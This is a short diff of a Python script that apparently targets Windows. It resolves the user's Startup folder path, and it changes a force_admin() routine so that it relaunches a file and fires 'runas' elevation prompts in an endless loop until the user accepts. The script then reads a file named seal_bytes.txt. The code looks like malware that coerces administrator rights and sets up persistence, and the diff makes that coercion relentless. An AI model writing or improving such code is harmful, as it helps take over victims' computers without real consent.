@@ -7,10 +7,9 @@ startup_path = str(getenv(
     "SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
 def force_admin():
     i = 0
-    while i != 10:
+    while windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1) != 42:
         startfile(path)
-        windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
-        i += 1
+
 
 
 with open("seal_bytes.txt", "rb")as f:
